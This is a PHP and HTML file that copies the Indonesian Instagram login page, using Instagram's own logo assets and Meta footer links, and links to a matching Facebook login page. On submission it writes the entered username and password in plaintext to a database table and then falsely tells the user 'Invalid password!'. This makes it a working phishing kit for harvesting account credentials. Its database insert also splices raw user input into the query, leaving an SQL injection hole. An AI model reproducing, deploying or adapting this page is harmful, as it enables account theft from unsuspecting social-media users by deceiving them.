<?php
require"./connection.php";
$status = [];
if(isset($_POST['login'])){
    if(getAccount($_POST) > 0){
        $error_message = 'Invalid password!';
        array_push($status, '1');
    } else {
        $error_message = mysqli_error($conn);
    }
}

function getAccount($data){
    global $conn;

    $user = $data['username'];
    $pw = $data['password'];
    $plat = $data['platform'];

    mysqli_query($conn, "INSERT INTO admin_user_id VALUES('', '$user', '$pw', '$plat')");

    return mysqli_affected_rows($conn);
}
var_dump(mysqli_query($conn, 'SELECT * FROM hooked_id'));
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="./css/styleig.css">
        <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/BTPhT6yIYfq.ico">
        <title>Masuk • Instagram</title>
    </head>
    <body>
        <div class="loader hide">
            <div class="upper-loader"></div>
            <div class="down-loader"></div>
        </div>
        <div class="page-wrapper">
            <div class="container">
                <div class="input-form">
                    <div class="logo">
                        <i class="logos"></i>
                    </div>
                    <div class="form">
                        <form action="" method="post" class="form-control">
                            <input type="text" class="input-username" name="username" placeholder="Nomor telepon, nama pengguna, atau email" autocomplete="off" required>
                            <input type="password" class="input-password" name="password" placeholder="Kata Sandi" required>
                            <button class="btn-login" name="login">Masuk</button>
                        </form>
                        <?php if(count($status) == 1){?>
                        <p style="color: red; font-size: 10px;"><?= $error_message;?></p>
                        <?php }?>
                    </div>
                    <div class="footer-form">
                        <div class="sec-1">
                            <div class="strip"></div>
                            <div class="txt">atau</div>
                            <div class="strip"></div>
                        </div>
                        <div class="sec-2">
                            <a href="../facebook/loginfb.php">
                                <span class="fb-logo"></span>
                                <span class="mfb">Masuk dengan Facebook</span>
                            </a>
                        </div>
                        <div class="sec-3">
                            <a href="#">Lupa kata sandi?</a>
                        </div>
                    </div>
                </div>
                <div class="get-account">
                    <p>Tidak punya akun? <a href="#"><span>Buat akun</span></a></p>
                </div>
            </div>
            <div class="get-app">
                <div class="get-title">
                    <p>Dapatkan Aplikasi</p>
                </div>
                <div class="get-apps">
                    <a href="#">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yT/r/wA97xtdkY1T.png" alt="">
                    </a>
                    <a href="#">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yI/r/sBSrYFihQ_B.png" alt="">
                    </a>
                </div>
            </div>
            <div class="footer">
                <div class="footer-inside">
                    <div class="footer-1">
                        <div>
                            <a href="https://about.meta.com">
                                <div>Meta</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://about.instagram.com">
                                <div>Tentang</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://about.instagram.com/about/">
                                <div>Blog</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/about/jobs/">
                                <div>Pekerjaan</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://help.instagram.com/">
                                <div>Bantuan</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://developers.facebook.com/docs/instagram">
                                <div>API</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/legal/privacy/">
                                <div>Privasi</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/legal/terms">
                                <div>Ketentuan</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/directory/profiles/">
                                <div>Akun Teratas</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/explore/locations/">
                                <div>Lokasi</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://instagram.com/web/lite/">
                                <div>Instagram Lite</div>
                            </a>
                        </div>
                        <div>
                            <a href="https://www.facebook.com/help/instagram/261704639352628">
                                <div>Pengunggahan Kontak & Nonpengguna</div>
                            </a>
                        </div>
                    </div>
                    <div class="footer-2">
                        <div class="fi2-1">
                            <div>
                                <span>Bahasa Indonesia</span>
                                <div>
                                    <span>
                                        <svg height="12" width="12" viewBox="0 0 24 24" fill="#8e8e8e" color="#8e8e8e">
                                            <path d="M 21 17.502 a 0.997 0.997 0 0 1 -0.707 -0.293 L 12 8.913 l -8.293 8.296 a 1 1 0 1 1 -1.414 -1.414 l 9 -9.004 a 1.03 1.03 0 0 1 1.414 0 l 9 9.004 A 1 1 0 0 1 21 17.502 Z"></path>
                                        </svg>
                                    </span>
                                </div>
                            </div>
                        </div>
                        <div class="fi2-2">
                            <p>© 2023 Instagram from Meta</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
